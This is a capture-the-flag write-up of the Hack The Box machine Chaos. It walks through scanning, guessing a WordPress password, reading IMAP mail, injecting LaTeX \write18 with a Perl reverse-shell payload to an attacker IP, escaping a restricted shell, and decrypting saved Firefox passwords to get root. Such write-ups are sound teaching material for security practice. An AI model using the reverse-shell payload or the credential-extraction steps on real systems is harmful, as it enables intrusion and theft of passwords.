---
title: "[HTB Writeups] - Chaos"
date: "2018-12-23"
categories: 
  - "hackthebox"
---

### Overview

To kick-off this blog, I am publishing my write-up for Chaos - a newest machine on Hack The Box as of today. The machine was a little tough, but its concepts require just medium level of enumeration and UNIX system skills.

**Total time spent: ~ 15 hours**

![](images/image.png)

### Nmap Scanning

Nmap scan report for 10.10.10.120  
Host is up (0.063s latency).  
Not shown: 65529 closed ports  
PORT      STATE SERVICE  VERSION  
  
80/tcp    open  http     Apache httpd 2.4.34 ((Ubuntu))  
| http-methods:   
|\_  Supported Methods: GET POST OPTIONS HEAD  
|http-server-header: Apache/2.4.34 (Ubuntu)   
|\_http-title: Site doesn\\'t have a title (text/html).   
  
110/tcp   open  pop3     Dovecot pop3d   
|\_pop3-capabilities: UIDL STLS CAPA TOP SASL AUTH-RESP-CODE PIPELINING RESP-CODES   
| ssl-cert: Subject: commonName=chaos   
| Subject Alternative Name: DNS:chaos   
| Issuer: commonName=chaos   
| Public Key type: rsa   
| Public Key bits: 2048   
| Signature Algorithm: sha256WithRSAEncryption   
| Not valid before: 2018-10-28T10:01:49   
| Not valid after:  2028-10-25T10:01:49   
| MD5:   af90 2165 92c7 740f d97a 786a 7e9f cb92   
|\_SHA-1: 5a4d 4223 3b08 a24b 7d5a e509 09bf 9570 aa2c f6ba   
|\_ssl-date: TLS randomness does not represent time   
  
143/tcp   open  imap     Dovecot imapd (Ubuntu)   
|\_imap-capabilities: more IDLE LOGIN-REFERRALS ENABLE STARTTLS Pre-login ID IMAP4rev1 OK post-login listed LITERAL+ capabilities LOGINDISABLEDA0001 SASL-IR have   
| ssl-cert: Subject: commonName=chaos   
| Subject Alternative Name: DNS:chaos   
| Issuer: commonName=chaos   
| Public Key type: rsa   
| Public Key bits: 2048   
| Signature Algorithm: sha256WithRSAEncryption   
| Not valid before: 2018-10-28T10:01:49   
| Not valid after:  2028-10-25T10:01:49   
| MD5:   af90 2165 92c7 740f d97a 786a 7e9f cb92   
|\_SHA-1: 5a4d 4223 3b08 a24b 7d5a e509 09bf 9570 aa2c f6ba   
|\_ssl-date: TLS randomness does not represent time   
  
993/tcp   open  ssl/imap Dovecot imapd (Ubuntu)   
|\_imap-capabilities: more IDLE ENABLE post-login Pre-login ID IMAP4rev1 AUTH=PLAINA0001 LOGIN-REFERRALS listed LITERAL+ capabilities OK SASL-IR have   
| ssl-cert: Subject: commonName=chaos   
| Subject Alternative Name: DNS:chaos   
| Issuer: commonName=chaos   
| Public Key type: rsa   
| Public Key bits: 2048   
| Signature Algorithm: sha256WithRSAEncryption   
| Not valid before: 2018-10-28T10:01:49   
| Not valid after:  2028-10-25T10:01:49   
| MD5:   af90 2165 92c7 740f d97a 786a 7e9f cb92   
|\_SHA-1: 5a4d 4223 3b08 a24b 7d5a e509 09bf 9570 aa2c f6ba   
|\_ssl-date: TLS randomness does not represent time   
  
995/tcp   open  ssl/pop3 Dovecot pop3d   
|\_pop3-capabilities: UIDL USER CAPA TOP SASL(PLAIN) AUTH-RESP-CODE PIPELINING RESP-CODES   
| ssl-cert: Subject: commonName=chaos   
| Subject Alternative Name: DNS:chaos   
| Issuer: commonName=chaos   
| Public Key type: rsa   
| Public Key bits: 2048   
| Signature Algorithm: sha256WithRSAEncryption   
| Not valid before: 2018-10-28T10:01:49   
| Not valid after:  2028-10-25T10:01:49   
| MD5:   af90 2165 92c7 740f d97a 786a 7e9f cb92   
|\_SHA-1: 5a4d 4223 3b08 a24b 7d5a e509 09bf 9570 aa2c f6ba |\_ssl-date: TLS randomness does not represent time   
  
10000/tcp open  http     MiniServ 1.890 (Webmin httpd)   
|\_http-favicon: Unknown favicon MD5: EA9A0A98E2A16B0ADEA1F6ED448F4CEF   
| http-methods:    
|  Supported Methods: GET HEAD POST OPTIONS  
|\_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).  

### Analysis

From Nmap result, the machine is running a web-server on port 80, mail services, and Webmin service.

The website running on port 80 seems weird to me. It looks like just a HTML page and showing nothing else.

![](images/image-2.png)

By habit, I started scanning its accessible folders using [DIRB](https://tools.kali.org/web-applications/dirb) and turned out it also had a hidden folder at **http://10.10.10.120/wp/wordpress/** . There is a post with protected password. After a little fuzzing, I found out the author used a wordpress's username for password (Check user at: **http://10.10.10.120/?author=1**) . Password is: **human**

Using this password to unlock the post, I got:

![](images/image-4.png)

At this stage, I was able to use the above cred for mail services. Note that port 110 and port 143 are avoiding you to use plaintext for commands, which mean we can't login to mail service through those ports. There are 2 options here which we can use:

1 - mutt  
2 - openssl connect

I decided to connect to mail service through port 993 using openssl connect command:

**openssl s\_client -connect 10.10.10.120:993**

After successfully connected to IMAP service on port 993, I used the following commands to login and dig into the mailbox:

**(Login)** a1 LOGIN ayush jiujitsu  
**(List all mail folders)** a2 LIST "" "\*"  
**(Go into chosen folder)** a3 EXAMINE Drafts  
**(Extract mail)** a4 FETCH 1 BODY\[\]

![](images/image-5.png)

There was a draft email with 2 additional attached files (encrypted message and encrypt function). However, extracting files using open openssl connect was a little annoying. I then switched to mutt to extract these files.

By adding a decrypt function, I was manged to retrieve original message:

![](images/image-6.png)

After adding the domain **chaos.htb** into **/etc/hosts**, I was able to spin up the URL. The URL is running a service which allows users to input LaTeX code document and generate PDF file. The first PDF template had an error with **texlive** which we can perform RCE by using **\\write18** primitive (Check out **[http://scumjr.github.io/2016/11/28/pwning-coworkers-thanks-to-latex/](http://scumjr.github.io/2016/11/28/pwning-coworkers-thanks-to-latex/)**)

**Payload:**  
\\write18{perl -e 'use Socket;$i="10.10.14.6";$p=4444;socket(S,PF\_INET,SOCK\_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr\_in($p,inet\_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'}

![](images/image-7.png)

Getting reverse shell at this point wasn't enough because shell user was **www-data**. After switching to the user I found on the website (**ayush**), I was stuck with limited shell (**/opt/rbash**). I have tried so many ways to escape but nothing worked. Looking back at how I switched users; I used **_su ayush_**. However, **su** just switches the user, providing a normal shell with an environment nearly the same as with the old user. Tried with **su -** and it then worked like a miracle! (Check out **[https://unix.stackexchange.com/questions/7013/why-do-we-use-su-and-not-just-su](https://unix.stackexchange.com/questions/7013/why-do-we-use-su-and-not-just-su)**)

![](images/image-8.png)

User flag

### Privilege Escalation

Escalating to root was a bit easier. There is an application folder which wasn't deleted.

.mozilla/

![](images/image-9.png)

Checking saved password within the application, I found all needed files for decrypting stored password

cert9.db  
key4.db  
logins.json

![](images/image-10.png)

Firefox saved passwords retrieval tool:  
**https://github.com/unode/firefox\_decrypt**

![](images/image-11.png)

Website:   https://chaos.htb:10000  
Username: 'root'  
Password: 'Thiv8wrej~'

Used the above cred to switch to root user, I was managed to get rooted the machine and retrieve root.txt

![](images/image-12.png)

Root flag

### References

https://tools.kali.org/web-applications/dirb  
http://blog.andrewc.com/2013/01/connect-to-imap-server-with-telnet/  
http://scumjr.github.io/2016/11/28/pwning-coworkers-thanks-to-latex/  
https://unix.stackexchange.com/questions/7013/why-do-we-use-su-and-not-just-su

_**Happy Hacking!**_
